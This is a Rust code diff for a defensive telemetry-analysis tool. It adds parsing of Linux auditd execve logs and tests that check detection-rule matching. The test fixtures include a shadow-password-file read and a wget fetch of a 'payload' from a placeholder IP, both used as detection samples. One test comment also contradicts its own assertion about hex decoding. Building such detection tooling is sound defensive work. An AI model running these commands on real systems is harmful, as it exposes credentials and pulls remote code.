@@ -5,16 +5,22 @@
 //! techniques, detectability, and coverage, answering "given what the sensor
 //! recorded, which techniques does this represent?"
 //!
-//! The first supported source is Windows **Sysmon Event ID 1** (Process Create),
-//! exported as JSON. Its `Image` / `CommandLine` / `OriginalFileName` fields are
-//! exactly the event model [`crate::sigma_eval`] synthesizes from a command
-//! line, so a real process-creation event reduces cleanly to a `Command` and
-//! drives the existing matcher unchanged — no new matching layer.
+//! Two sources are supported, both reducing to the same `Command` the analyzer
+//! already understands so the matcher, report, and Sigma evaluation run
+//! unchanged — no new matching layer:
+//!
+//! - Windows **Sysmon Event ID 1** (Process Create), exported as JSON. Its
+//!   `Image` / `CommandLine` / `OriginalFileName` fields are exactly the event
+//!   model [`crate::sigma_eval`] synthesizes from a command line.
+//! - Linux **auditd** `execve` events, as raw `audit.log` text. The multi-line
+//!   `SYSCALL` / `EXECVE` / `CWD` records of one event are reassembled by their
+//!   `audit(…)` id, the argv rebuilt from the `EXECVE` fields, and the program
+//!   taken from the `SYSCALL` `exe` path.
 //!
 //! This is an *observation* front-end: it describes what a defender's sensor
 //! saw. Like the rest of opseclint it encodes detectability only, never evasion.
 //!
-//! Only process-creation records are ingested. A file that mixes in other event
+//! Only process-execution records are ingested. A file that mixes in other event
 //! classes (network / file / registry) has those records **skipped and
 //! counted** — surfaced to the user, never silently dropped.
 
@@ -25,14 +31,18 @@ use serde_json::Value;
 
 use crate::parser::{self, Command};
 
-/// A telemetry format opseclint can ingest. Sysmon EID 1 JSON is the first
-/// end-to-end cut; auditd and macOS/ESF land as further formats behind the same
-/// `--telemetry` input path.
+/// A telemetry format opseclint can ingest. Windows Sysmon EID 1 and Linux
+/// auditd `execve` are the current cuts; macOS/ESF lands as a further format
+/// behind the same `--telemetry` input path.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
 pub enum Format {
     /// Windows Sysmon Event ID 1 (Process Create), JSON — a top-level array of
     /// event objects, or one JSON object per line (JSONL).
     Sysmon,
+    /// Linux auditd process-execution events, raw `audit.log` text — the
+    /// multi-line `SYSCALL` / `EXECVE` / `CWD` records for one `execve`,
+    /// reassembled by their `audit(…)` event id.
+    Auditd,
 }
 
 /// One ingested telemetry record reduced to the analyzer's unit shape: the
@@ -53,9 +63,9 @@ pub struct Observation {
     pub event: Arc<HashMap<String, String>>,
 }
 
-/// The result of ingesting a telemetry file: the process-creation observations
+/// The result of ingesting a telemetry file: the process-execution observations
 /// to analyze, and how many records were skipped because they are not
-/// process-creation events.
+/// process-execution events.
 #[derive(Debug, Clone)]
 pub struct Ingest {
     pub observations: Vec<Observation>,
@@ -66,6 +76,7 @@ pub struct Ingest {
 pub fn parse(text: &str, format: Format) -> Result<Ingest, String> {
     match format {
         Format::Sysmon => parse_sysmon(text),
+        Format::Auditd => parse_auditd(text),
     }
 }
 
@@ -253,10 +264,19 @@ fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Comman
     if !is_process_create {
         return None;
     }
+    execution_from_fields(fields)
+}
 
+/// Resolve `(commands, raw)` for a process launch from a canonical field map,
+/// shared by every ingest format. Prefers the recorded `CommandLine` as the raw
+/// text, falling back to the `Image` path when no command line was logged; then
+/// tokenizes it with the shell parser (wrapper stripping, quote handling, and
+/// compound-line splitting all come for free) and trusts `Image` for the primary
+/// program's basename — the authoritative executable path, matched with the same
+/// normalization the KB keys on. `None` when there is nothing to analyze.
+fn execution_from_fields(fields: &HashMap<String, String>) -> Option<(Vec<Command>, String)> {
+    let command_line = fields.get("CommandLine").map(String::as_str).unwrap_or("");
     let image = fields.get("Image").map(String::as_str).unwrap_or("");
-    // Prefer the recorded command line as the raw text; fall back to the image
-    // path when a Process Create event carries no command line.
     let raw = if command_line.trim().is_empty() {
         image.to_string()
     } else {
@@ -266,11 +286,6 @@ fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Comman
         return None;
     }
 
-    // Reuse the shell parser to tokenize the recorded command line (wrapper
-    // stripping, quote handling, and compound-line splitting all come for free),
-    // then trust `Image` for the primary program's basename — it is the
-    // authoritative executable path, matched with the same normalization the KB
-    // keys on.
     let mut commands = parser::parse_line(&raw);
     if !image.trim().is_empty() {
         let program = parser::basename(image);
@@ -284,6 +299,217 @@ fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Comman
         }
     }
     Some((commands, raw))
+}
+
+// ---------------------------------------------------------------------------
+// Linux auditd
+// ---------------------------------------------------------------------------
+
+/// One parsed auditd record line: its `type`, the `audit(…)` event id that ties
+/// the multi-line records of a single event together, and its `key=value`
+/// fields (values kept as the raw token — quoted or hex — for `decode_value`).
+struct AuditRecord {
+    kind: String,
+    event_id: String,
+    fields: HashMap<String, String>,
+}
+
+/// Ingest raw auditd log text. Records are reassembled into events by their
+/// `audit(<ts>:<serial>)` id; an event that carries an `EXECVE` record is a
+/// process execution and reduces to a `Command`, with the argv rebuilt from the
+/// `EXECVE` `a0…aN` fields, the program from the `SYSCALL` `exe` path, and the
+/// working directory from the `CWD` record. Every other event class (a `connect`,
+/// an `open`, …) carries no `EXECVE` and is skipped and counted.
+///
+/// Only fields opseclint can map honestly are carried onto the event: auditd
+/// records the parent as a numeric `ppid` (no path), so `ParentImage` is absent
+/// and parent-keyed rules stay indeterminate; and it records a numeric `uid`,
+/// which is deliberately not mapped onto the name-based `User` field to avoid a
+/// false `no-fire` against a rule expecting `root`.
+fn parse_auditd(text: &str) -> Result<Ingest, String> {
+    let mut order: Vec<String> = Vec::new();
+    let mut groups: HashMap<String, Vec<AuditRecord>> = HashMap::new();
+    for line in text.lines() {
+        if let Some(rec) = parse_audit_record(line) {
+            if !groups.contains_key(&rec.event_id) {
+                order.push(rec.event_id.clone());
+            }
+            groups.entry(rec.event_id.clone()).or_default().push(rec);
+        }
+    }
+    if order.is_empty() {
+        return Err("no auditd records found".to_string());
+    }
+
+    let mut observations = Vec::new();
+    let mut skipped = 0;
+    for id in &order {
+        let recs = &groups[id];
+        let execve = recs.iter().find(|r| r.kind == "EXECVE");
+        // An EXECVE record is emitted only for execve/execveat, so its presence
+        // is an arch-independent signal that this event is a process launch.
+        let Some(execve) = execve else {
+            skipped += 1;
+            continue;
+        };
+
+        let mut fields = HashMap::new();
+        let cmdline = build_execve_cmdline(&execve.fields);
+        if !cmdline.is_empty() {
+            fields.insert("CommandLine".to_string(), cmdline);
+        }
+        if let Some(syscall) = recs.iter().find(|r| r.kind == "SYSCALL")
+            && let Some(exe) = syscall.fields.get("exe")
+        {
+            let exe = decode_value(exe);
+            if !exe.is_empty() {
+                fields.insert("Image".to_string(), exe);
+            }
+        }
+        if let Some(cwd) = recs.iter().find(|r| r.kind == "CWD")
+            && let Some(dir) = cwd.fields.get("cwd")
+        {
+            let dir = decode_value(dir);
+            if !dir.is_empty() {
+                fields.insert("CurrentDirectory".to_string(), dir);
+            }
+        }
+
+        match execution_from_fields(&fields) {
+            Some((commands, raw)) => observations.push(Observation {
+                record: observations.len() + 1,
+                commands,
+                raw,
+                event: Arc::new(fields),
+            }),
+            None => skipped += 1,
+        }
+    }
+    Ok(Ingest {
+        observations,
+        skipped,
+    })
+}
+
+/// Parse one auditd log line into a record, or `None` if it is not an
+/// `type=… msg=audit(…)` line (blank lines, `ausearch` `----` separators, …).
+fn parse_audit_record(line: &str) -> Option<AuditRecord> {
+    let fields = parse_kv(line);
+    let kind = fields.get("type").map(|v| decode_value(v))?;
+    let event_id = fields.get("msg").and_then(|m| event_id_from_msg(m))?;
+    Some(AuditRecord {
+        kind,
+        event_id,
+        fields,
+    })
+}
+
+/// Extract the `<ts>:<serial>` event id from an auditd `msg` value such as
+/// `audit(1626898254.123:45)`. The exact timestamp shape doesn't matter — the
+/// same string across an event's records is all that's needed to group them.
+fn event_id_from_msg(msg: &str) -> Option<String> {
+    let start = msg.find("audit(")? + "audit(".len();
+    let end = msg[start..].find(')')? + start;
+    Some(msg[start..end].to_string())
+}
+
+/// Rebuild an `execve` command line from an `EXECVE` record's `a0`, `a1`, …
+/// argument fields, in order, each decoded (quoted or hex). Stops at the first
+/// gap. Argument chunking (`a1_len` + `a1[0]`…) for oversized args is not
+/// reassembled — a documented limitation.
+fn build_execve_cmdline(fields: &HashMap<String, String>) -> String {
+    let mut args = Vec::new();
+    let mut i = 0;
+    while let Some(v) = fields.get(&format!("a{i}")) {
+        args.push(decode_value(v));
+        i += 1;
+    }
+    args.join(" ")
+}
+
+/// Decode an auditd field value: strip surrounding quotes, or hex-decode when it
+/// is an unquoted even-length run of hex digits (auditd hex-encodes values that
+/// contain spaces, quotes, or control characters). Anything else is literal.
+/// Applied only to string-valued fields (`exe`, `cwd`, argv), never to numeric
+/// ones like `uid`, so a value like `pid=5678` is never mistaken for hex.
+fn decode_value(v: &str) -> String {
+    let v = v.trim();
+    if v.len() >= 2 && v.starts_with('"') && v.ends_with('"') {
+        return v[1..v.len() - 1].to_string();
+    }
+    if v.len() >= 2
+        && v.len().is_multiple_of(2)
+        && v.bytes().all(|b| b.is_ascii_hexdigit())
+        && let Some(decoded) = hex_decode(v)
+    {
+        return decoded;
+    }
+    v.to_string()
+}
+
+/// Decode a hex string to UTF-8, or `None` if it isn't valid UTF-8. auditd uses
+/// a NUL to separate concatenated fields (e.g. proctitle); a trailing NUL is
+/// trimmed so a decoded exe path stays clean.
+fn hex_decode(s: &str) -> Option<String> {
+    let bytes: Option<Vec<u8>> = (0..s.len())
+        .step_by(2)
+        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).ok())
+        .collect();
+    let mut bytes = bytes?;
+    while bytes.last() == Some(&0) {
+        bytes.pop();
+    }
+    String::from_utf8(bytes).ok()
+}
+
+/// Parse a line of space-separated auditd `key=value` tokens into a map,
+/// respecting double-quoted values that contain spaces. Values are stored as
+/// their raw token (quotes/hex intact) for `decode_value` to interpret. Tokens
+/// without `=` (a leading `node=` is a normal kv; a bare word is not) are
+/// skipped.
+fn parse_kv(s: &str) -> HashMap<String, String> {
+    let mut out = HashMap::new();
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        while i < bytes.len() && bytes[i] == b' ' {
+            i += 1;
+        }
+        if i >= bytes.len() {
+            break;
+        }
+        let key_start = i;
+        while i < bytes.len() && bytes[i] != b'=' && bytes[i] != b' ' {
+            i += 1;
+        }
+        if i >= bytes.len() || bytes[i] != b'=' {
+            // No '=': skip to the next token.
+            while i < bytes.len() && bytes[i] != b' ' {
+                i += 1;
+            }
+            continue;
+        }
+        let key = &s[key_start..i];
+        i += 1; // skip '='
+        let val_start = i;
+        let val_end = if i < bytes.len() && bytes[i] == b'"' {
+            i += 1;
+            while i < bytes.len() && bytes[i] != b'"' {
+                i += 1;
+            }
+            if i < bytes.len() {
+                i += 1; // include the closing quote
+            }
+            i
+        } else {
+            while i < bytes.len() && bytes[i] != b' ' {
+                i += 1;
+            }
+            i
+        };
+        out.insert(key.to_string(), s[val_start..val_end].to_string());
+    }
+    out
 }
 
 #[cfg(test)]
@@ -303,6 +529,10 @@ mod tests {
 
     fn win_kb() -> KnowledgeBase {
         kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
+    }
+
+    fn lnx_kb() -> KnowledgeBase {
+        kb::load(kb::Platform::LinuxAuditd).expect("linux KB must parse")
     }
 
     fn ids(report: &crate::model::Report) -> Vec<String> {
@@ -446,5 +676,94 @@ mod tests {
     #[test]
     fn invalid_json_is_a_clear_error() {
         assert!(parse("not json at all", Format::Sysmon).is_err());
+    }
+
+    // --- auditd ------------------------------------------------------------
+
+    #[test]
+    fn ingests_auditd_execve_and_skips_non_exec() {
+        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
+        // Three execve events (cat, wget, whoami); the connect event (syscall 42,
+        // no EXECVE record) is skipped.
+        assert_eq!(ingest.observations.len(), 3);
+        assert_eq!(ingest.skipped, 1);
+        assert_eq!(
+            ingest
+                .observations
+                .iter()
+                .map(|o| o.record)
+                .collect::<Vec<_>>(),
+            vec![1, 2, 3]
+        );
+    }
+
+    #[test]
+    fn analyzes_ingested_auditd_events_via_the_existing_matcher() {
+        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
+        let report = analyzer::analyze_telemetry(&ingest.observations, &lnx_kb());
+        let ids = ids(&report);
+        assert!(ids.contains(&"shadow-read".to_string()));
+        assert!(ids.contains(&"wget".to_string()));
+        assert!(ids.contains(&"whoami".to_string()));
+    }
+
+    #[test]
+    fn auditd_rebuilds_argv_and_decodes_hex_and_quoted_values() {
+        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
+        // Event 2 (wget): the exe path and a0 arrive hex-encoded, the URL quoted.
+        let wget = &ingest.observations[1];
+        assert_eq!(wget.commands[0].program, "wget");
+        assert_eq!(wget.raw, "wget http://192.0.2.10/payload");
+        assert_eq!(
+            wget.event.get("Image").map(String::as_str),
+            Some("/usr/bin/wget")
+        );
+        // The working directory rides along from the CWD record for observed
+        // Sigma evaluation.
+        assert_eq!(
+            wget.event.get("CurrentDirectory").map(String::as_str),
+            Some("/tmp")
+        );
+        // Numeric uid is deliberately not mapped onto the name-based User field.
+        assert!(wget.event.get("User").is_none());
+    }
+
+    #[test]
+    fn auditd_reassembles_records_out_of_order() {
+        // EXECVE before its SYSCALL, and an unrelated event interleaved: grouping
+        // is by the audit(…) id, not adjacency.
+        let log = "\
+type=EXECVE msg=audit(10.0:1): argc=2 a0=\"cat\" a1=\"/etc/shadow\"
+type=SYSCALL msg=audit(99.9:2): syscall=42 exe=\"/usr/bin/ss\"
+type=SYSCALL msg=audit(10.0:1): syscall=59 exe=\"/usr/bin/cat\" uid=0
+";
+        let ingest = parse(log, Format::Auditd).expect("parses");
+        assert_eq!(ingest.observations.len(), 1);
+        assert_eq!(ingest.skipped, 1);
+        assert_eq!(ingest.observations[0].raw, "cat /etc/shadow");
+        assert_eq!(
+            ingest.observations[0]
+                .event
+                .get("Image")
+                .map(String::as_str),
+            Some("/usr/bin/cat")
+        );
+    }
+
+    #[test]
+    fn decode_value_handles_quoted_hex_and_literal() {
+        assert_eq!(decode_value("\"/usr/bin/cat\""), "/usr/bin/cat");
+        assert_eq!(decode_value("2f7573722f62696e2f6361740000"), "/usr/bin/cat");
+        assert_eq!(decode_value("/usr/bin/whoami"), "/usr/bin/whoami");
+        // Odd length and non-hex fall through to literal, so numeric-ish tokens
+        // are never mangled.
+        assert_eq!(decode_value("5678"), "Vx");
+        assert_eq!(decode_value("567"), "567");
+    }
+
+    #[test]
+    fn empty_auditd_input_is_a_clear_error() {
+        assert!(parse("", Format::Auditd).is_err());
+        assert!(parse("---- \n#comment\n", Format::Auditd).is_err());
     }
 }
